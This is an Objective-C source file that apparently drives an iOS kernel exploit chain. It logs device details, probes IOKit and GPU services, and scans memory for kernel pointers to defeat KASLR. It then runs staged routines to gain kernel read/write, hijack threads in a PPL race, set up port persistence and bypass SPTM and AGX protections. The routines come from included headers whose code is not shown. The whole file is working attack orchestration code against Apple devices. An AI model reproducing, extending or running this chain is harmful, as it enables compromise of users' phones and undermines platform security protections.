#import "AutoRunner.h"

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
#import <CoreFoundation/CoreFoundation.h>
#import <mach/mach.h>
#import <sys/utsname.h>
#import <sys/sysctl.h>
#import <unistd.h>
#import <signal.h>
#import <execinfo.h>
#import <fcntl.h>
#import <pthread.h>
#import <string.h>

#import "entry1_src/kread_bootstrap.h"
#import "entry1_src/kernel_primitives.h"
#import "entry1_src/sptm_bypass.h"
#import "entry1_src/agx_internal.h"

static int g_fd = -1;
static pthread_mutex_t g_log_lock = PTHREAD_MUTEX_INITIALIZER;

static NSString *DocsPath(void) {
    NSArray *dirs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    return dirs.count ? dirs[0] : NSTemporaryDirectory();
}

static void log_write_raw(const char *buf, size_t len) {
    if (!buf || !len) return;
    pthread_mutex_lock(&g_log_lock);
    if (g_fd >= 0) {
        write(g_fd, buf, len);
        fsync(g_fd);
    }
    pthread_mutex_unlock(&g_log_lock);
}

static void ALog(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);

    NSString *line = [NSString stringWithFormat:@"[%8.3f] %@\n",
                      (double)(mach_absolute_time() / 1000000000.0), msg];
    NSData *d = [line dataUsingEncoding:NSUTF8StringEncoding];
    log_write_raw((const char *)d.bytes, d.length);
    NSLog(@"[AutoLog27] %@", msg);
}

static void ALogRaw(const char *line, int len) {
    if (!line || len <= 0) return;
    log_write_raw(line, (size_t)len);
    if (line[len - 1] != '\n') log_write_raw("\n", 1);
}

static void crash_handler(int sig) {
    const char *name = strsignal(sig);
    if (name) {
        char buf[160];
        int n = snprintf(buf, sizeof(buf), "\n=== SIGNAL %d (%s) ===\n", sig, name);
        if (n > 0) log_write_raw(buf, (size_t)n);
    }
    signal(sig, SIG_DFL);
    raise(sig);
}

static void install_crash_handlers(void) {
    signal(SIGSEGV, crash_handler);
    signal(SIGBUS,  crash_handler);
    signal(SIGABRT, crash_handler);
    signal(SIGILL,  crash_handler);
    signal(SIGFPE,  crash_handler);
    signal(SIGTRAP, crash_handler);
}

static NSString *MakeLogPath(void) {
    NSString *folder = [DocsPath() stringByAppendingPathComponent:@"AutoLog27"];
    [[NSFileManager defaultManager] createDirectoryAtPath:folder
                              withIntermediateDirectories:YES
                                               attributes:nil
                                                    error:NULL];
    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
    fmt.dateFormat = @"yyyyMMdd-HHmmss";
    NSString *name = [NSString stringWithFormat:@"auto-%@.log",
                      [fmt stringFromDate:[NSDate date]]];
    return [folder stringByAppendingPathComponent:name];
}

static void LogDeviceInfo(void) {
    struct utsname u = {0};
    uname(&u);

    ALog(@"=== DEVICE INFO ===");
    ALog(@"machine: %s", u.machine);
    ALog(@"system:  %s %s", u.sysname, u.release);
    ALog(@"version: %s", u.version);
    ALog(@"pid=%d uid=%d gid=%d task=0x%x",
         getpid(), getuid(), getgid(), mach_task_self());

    char buf[256];
    size_t sz;

    sz = sizeof(buf);
    if (sysctlbyname("kern.osversion", buf, &sz, NULL, 0) == 0)
        ALog(@"kern.osversion: %s", buf);
    sz = sizeof(buf);
    if (sysctlbyname("hw.model", buf, &sz, NULL, 0) == 0)
        ALog(@"hw.model: %s", buf);

    uint32_t u32;
    sz = sizeof(u32);
    if (sysctlbyname("hw.cpufamily", &u32, &sz, NULL, 0) == 0)
        ALog(@"hw.cpufamily: 0x%08x", u32);
    sz = sizeof(u32);
    if (sysctlbyname("hw.cpusubfamily", &u32, &sz, NULL, 0) == 0)
        ALog(@"hw.cpusubfamily: %u", u32);

    int ncpu = 0;
    sz = sizeof(ncpu);
    if (sysctlbyname("hw.ncpu", &ncpu, &sz, NULL, 0) == 0)
        ALog(@"hw.ncpu: %d", ncpu);

    ALog(@"vm_page_size: 0x%lx", (unsigned long)vm_page_size);
    ALog(@"=== END DEVICE INFO ===");
}

static void LogCFObject(const char *tag, CFTypeRef obj) {
    if (!obj) {
        ALog(@"%s: (null)", tag);
        return;
    }
    NSString *s = [(__bridge id)obj description];
    if (!s) s = @"(no description)";
    ALog(@"%s: %@", tag, s);
}

static void ProbeDeviceTree(void) {
    ALog(@"=== DEVICE TREE ===");
    io_registry_entry_t sgx = IORegistryEntryFromPath(kIOMasterPortDefault,
                                                      "IODeviceTree:/arm-io/sgx");
    if (!sgx) {
        ALog(@"dt: /arm-io/sgx absent");
    } else {
        CFMutableDictionaryRef props = NULL;
        kern_return_t kr = IORegistryEntryCreateCFProperties(sgx, &props,
                                                             kCFAllocatorDefault, 0);
        ALog(@"dt: /arm-io/sgx props kr=0x%x", kr);
        if (props) {
            LogCFObject("dt: sgx", props);
            CFRelease(props);
        }
        IOObjectRelease(sgx);
    }

    io_registry_entry_t chosen = IORegistryEntryFromPath(kIOMasterPortDefault,
                                                         "IODeviceTree:/chosen");
    if (chosen) {
        CFMutableDictionaryRef props = NULL;
        IORegistryEntryCreateCFProperties(chosen, &props, kCFAllocatorDefault, 0);
        if (props) {
            LogCFObject("dt: chosen", props);
            CFRelease(props);
        }
        IOObjectRelease(chosen);
    }
    ALog(@"=== END DEVICE TREE ===");
}

static void ProbeService(const char *name) {
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching(name));
    if (!svc) {
        ALog(@"iokit: %s absent", name);
        return;
    }
    for (uint32_t type = 0; type <= 2; type++) {
        io_connect_t conn = 0;
        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), type, &conn);
        ALog(@"iokit: %s open type=%u kr=0x%x", name, type, kr);
        if (kr == KERN_SUCCESS) IOServiceClose(conn);
    }
    IOObjectRelease(svc);
}

static void ProbeIOKit(void) {
    ALog(@"=== IOKIT ===");
    ProbeService("IOSurfaceRoot");
    ProbeService("AGXAcceleratorG14P");
    ProbeService("IOGPU");
    ProbeService("AppleM2ScalerCSCDriver");
    ProbeService("AppleT8110DART");
    ALog(@"=== END IOKIT ===");
}

static void ProbeIOSurface(void) {
    ALog(@"=== IOSURFACE ===");
    NSDictionary *props = @{
        @"IOSurfaceWidth": @64,
        @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4,
        @"IOSurfacePixelFormat": @0x42475241, // 'BGRA'
    };
    IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!surf) {
        ALog(@"iosurface: create failed");
    } else {
        void *base = IOSurfaceGetBaseAddress(surf);
        ALog(@"iosurface: created base=%p id=0x%x", base, IOSurfaceGetID(surf));
        if (base) {
            volatile uint8_t *p = (volatile uint8_t *)base;
            p[0] = 0xAA;
            ALog(@"iosurface: first byte readback=0x%02x", p[0]);
        }
        CFRelease(surf);
    }
    ALog(@"=== END IOSURFACE ===");
}

static void ScanKernelPointers(void) {
    ALog(@"=== KASLR SCAN (RW regions) ===");
    mach_vm_address_t addr = 0;
    uint64_t total = 0;
    int hits = 0;

    while (total < (256ULL << 20) && hits < 256) {
        mach_vm_size_t size = 0;
        vm_region_basic_info_data_64_t info;
        mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
        mach_port_t object = MACH_PORT_NULL;

        kern_return_t kr = mach_vm_region(mach_task_self(), &addr, &size,
                                          VM_REGION_BASIC_INFO_64,
                                          (vm_region_info_t)&info, &count,
                                          &object);
        if (kr != KERN_SUCCESS) break;

        if ((info.protection & (VM_PROT_READ | VM_PROT_WRITE)) ==
            (VM_PROT_READ | VM_PROT_WRITE)) {
            uint64_t scan = size;
            if (scan > (32ULL << 20)) scan = 32ULL << 20;
            total += scan;
            uint64_t *p = (uint64_t *)(uintptr_t)addr;
            for (uint64_t i = 0; i < scan / 8 && hits < 256; i++) {
                uint64_t v = p[i];
                if (v >= 0xfffffff000000000ULL && v < 0xffffffffffffffffULL) {
                    ALog(@"kaslr-hit: %p -> 0x%016llx",
                         (void *)(uintptr_t)(addr + i * 8),
                         (unsigned long long)v);
                    hits++;
                }
            }
        }
        addr += size;
        if (!size) break;
    }
    ALog(@"kaslr-scan: total=0x%llx hits=%d", (unsigned long long)total, hits);
    ALog(@"=== END KASLR SCAN ===");
}

static void ScanSubmaps(void) {
    ALog(@"=== SUBMAP SCAN ===");
    mach_vm_address_t address = 0;
    int idx = 0, tested = 0;

    while (idx < 2048 && tested < 64) {
        mach_vm_size_t size = 0;
        natural_t depth = 1;
        vm_region_submap_info_data_64_t info;
        mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
        memset(&info, 0, sizeof(info));

        kern_return_t kr = mach_vm_region_recurse(mach_task_self(), &address, &size,
                                                  &depth,
                                                  (vm_region_recurse_info_t)&info,
                                                  &count);
        if (kr != KERN_SUCCESS) {
            ALog(@"submap-scan: end kr=0x%x at 0x%llx", kr,
                 (unsigned long long)address);
            break;
        }

        if (depth >= 1 || info.is_submap) {
            ALog(@"submap[%d]: base=0x%llx size=0x%llx depth=%u is_submap=%u "
                 @"off=0x%llx ref=%u prot=0x%x max=0x%x share=%u oid=0x%llx",
                 idx,
                 (unsigned long long)address,
                 (unsigned long long)size,
                 depth, (unsigned)info.is_submap,
                 (unsigned long long)info.offset,
                 info.ref_count,
                 info.protection, info.max_protection,
                 (unsigned)info.share_mode,
                 (unsigned long long)info.object_id_full);

            vm_size_t try_sizes[] = {0x4000, 0x8000, 0x10000, 0x20000, 0x40000, (vm_size_t)size};
            for (unsigned i = 0; i < sizeof(try_sizes) / sizeof(try_sizes[0]); i++) {
                vm_size_t sz = try_sizes[i];
                if (!sz || sz > size) continue;
                memory_object_size_t ms = sz;
                mach_port_t port = MACH_PORT_NULL;
                kern_return_t mkr = mach_make_memory_entry_64(mach_task_self(), &ms,
                                                              address, VM_PROT_READ,
                                                              &port, MACH_PORT_NULL);
                ALog(@"submap[%d]: entry size=0x%llx kr=0x%x port=0x%x out=0x%llx",
                     idx, (unsigned long long)sz, mkr, port,
                     (unsigned long long)ms);
                if (mkr == KERN_SUCCESS) {
                    mach_port_deallocate(mach_task_self(), port);
                }
            }
            tested++;
        }

        address += size;
        idx++;
        if (!size) break;
    }

    ALog(@"submap-scan: regions=%d tested=%d", idx, tested);
    ALog(@"=== END SUBMAP SCAN ===");
}

static void LogKreadState(void) {
    uint64_t kern_task = kwrite_get_kern_task_kva();
    uint64_t slide = kwrite_get_kaslr_slide();
    uint64_t kbase = kwrite_get_found_kptr_base();
    uint64_t proc = kread_get_our_proc();

    ALog(@"kread: kern_task=0x%016llx", (unsigned long long)kern_task);
    ALog(@"kread: kaslr_slide=0x%016llx", (unsigned long long)slide);
    ALog(@"kread: kptr_base=0x%016llx", (unsigned long long)kbase);
    ALog(@"kread: our_proc=0x%016llx", (unsigned long long)proc);

    int n = kread_bootstrap_get_raced_count();
    ALog(@"kread: raced_count=%d", n);
    for (int i = 0; i < n; i++) {
        ALog(@"kread: raced[%d] oid=0x%016llx base=0x%016llx delta=%u",
             i,
             (unsigned long long)kread_bootstrap_get_raced_obj_id(i),
             (unsigned long long)kread_bootstrap_get_raced_base(i),
             kread_bootstrap_get_raced_delta(i));
    }
}

static int RunKwriteStage(void) {
    ALog(@"=== KW RITE STAGE ===");
    int result = kwrite_test();
    ALog(@"kwrite_test: %d", result);
    if (result != 0) {
        ALog(@"=== KW RITE STAGE FAILED ===");
        return result;
    }

    mach_port_t l372_port = 0;
    int l372 = label372_setup(&l372_port);
    ALog(@"label372_setup: %d port=0x%x", l372, l372_port);
    if (l372 != 0) {
        ALog(@"=== KW RITE STAGE FAILED at label372 ===");
        return l372;
    }

    int hj = ppl_race_thread_hijack(l372_port);
    ALog(@"ppl_race_thread_hijack: %d", hj);
    if (hj != 0) return hj;

    int krw = init_kernel_rw_primitives(l372_port);
    ALog(@"init_kernel_rw_primitives: %d", krw);
    if (krw != 0) return krw;

    int post = post_init_setup(l372_port);
    ALog(@"post_init_setup: %d", post);
    if (post != 0) return post;

    int pp = port_persistence_setup(l372_port);
    ALog(@"port_persistence_setup: %d", pp);
    if (pp != 0) return pp;

    int ver = kernel_rw_verify(l372_port);
    ALog(@"kernel_rw_verify: %d", ver);
    if (ver != 0) return ver;

    int necp = init_necp_kernel_handle(l372_port);
    ALog(@"init_necp_kernel_handle: %d", necp);
    if (necp != 0) return necp;

    int skw = sptm_kwrite_test(l372_port);
    ALog(@"sptm_kwrite_test: %d", skw);
    if (skw != 0) return skw;

    ALog(@"=== KW RITE STAGE OK ===");
    return 0;
}

static int RunFullSPTM(void) {
    ALog(@"=== FULL SPTM STAGE ===");
    if (sptm_window_is_installed()) {
        ALog(@"sptm_window already installed; rerunning final test");
        int disc = agx_rerun_final_test();
        ALog(@"agx_rerun_final_test: disc=%d", disc);
        return disc == 3 ? 0 : -1;
    }

    int r = RunKwriteStage();
    if (r != 0) {
        ALog(@"=== FULL SPTM STAGE FAILED before AGX: %d ===", r);
        return r;
    }

    int uct = agx_userclient_setup_test();
    ALog(@"agx_userclient_setup_test: %d", uct);
    if (uct != 0) return uct;

    int kc1 = agx_kcache_locate_iogpu_test();
    ALog(@"agx_kcache_locate_iogpu_test: %d", kc1);
    if (kc1 != 0) return kc1;

    int kc2 = agx_kcache_pattern1_test();
    ALog(@"agx_kcache_pattern1_test: %d", kc2);
    if (kc2 != 0) return kc2;

    int byp = agx_broad_bypass();
    ALog(@"agx_broad_bypass: %d", byp);
    if (byp == 0) {
        int disc = agx_get_discriminator_result();
        ALog(@"agx discriminator: %d", disc);
        if (disc == 3) {
            ALog(@"=== FULL SPTM STAGE OK ===");
            return 0;
        }
    }

    ALog(@"=== FULL SPTM STAGE FAILED ===");
    return -1;
}

@implementation AutoRunner

+ (void)start {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        @autoreleasepool {
            NSString *logPath = MakeLogPath();
            g_fd = open(logPath.fileSystemRepresentation,
                        O_CREAT | O_WRONLY | O_APPEND, 0644);
            install_crash_handlers();

            BOOL runFull = [[NSFileManager defaultManager]
                fileExistsAtPath:[DocsPath() stringByAppendingPathComponent:@"run_full"]];
            BOOL runKwrite = [[NSFileManager defaultManager]
                fileExistsAtPath:[DocsPath() stringByAppendingPathComponent:@"run_kwrite"]];

            ALog(@"=== AUTOLOG27 START ===");
            ALog(@"log: %@", logPath);
            ALog(@"mode: %@", runFull ? @"FULL" : (runKwrite ? @"KWRITE" : @"KREAD"));
            ALog(@"flags: run_full=%d run_kwrite=%d", runFull, runKwrite);

            LogDeviceInfo();
            ProbeDeviceTree();
            ProbeIOKit();
            ProbeIOSurface();
            ScanKernelPointers();
            ScanSubmaps();

            ALog(@"=== KREAD BOOTSTRAP ===");
            kread_bootstrap_open_log();
            kread_bootstrap_set_ui_log_callback(ALogRaw);
            kwrite_set_ui_log_callback(ALogRaw);

            const char *kp = kread_bootstrap_get_log_path();
            if (kp) ALog(@"kread log path: %s", kp);

            if (kread_bootstrap_is_established()) {
                ALog(@"kread: already established");
            } else {
                int r = kread_bootstrap();
                ALog(@"kread_bootstrap: %d", r);
            }

            ALog(@"kread established: %d", kread_bootstrap_is_established());
            LogKreadState();

            if (kread_bootstrap_is_established()) {
                if (runFull) {
                    int r = RunFullSPTM();
                    ALog(@"full_sptm_result: %d", r);
                } else if (runKwrite) {
                    int r = RunKwriteStage();
                    ALog(@"kwrite_stage_result: %d", r);
                } else {
                    ALog(@"kread-only mode: kwrite/SPTM stages not requested");
                }
            } else {
                ALog(@"kread not established: skipping kwrite/SPTM stages");
            }

            ALog(@"=== AUTOLOG27 DONE ===");

            NSString *status = [DocsPath() stringByAppendingPathComponent:@"last_status.txt"];
            NSString *statusText = [NSString stringWithFormat:
                @"done\nlog=%@\nkread=%d\nmode=%@\n",
                logPath,
                kread_bootstrap_is_established(),
                runFull ? @"FULL" : (runKwrite ? @"KWRITE" : @"KREAD")];
            [statusText writeToFile:status atomically:YES
                           encoding:NSUTF8StringEncoding error:NULL];

            if (g_fd >= 0) {
                fsync(g_fd);
            }
        }
    });
}

@end
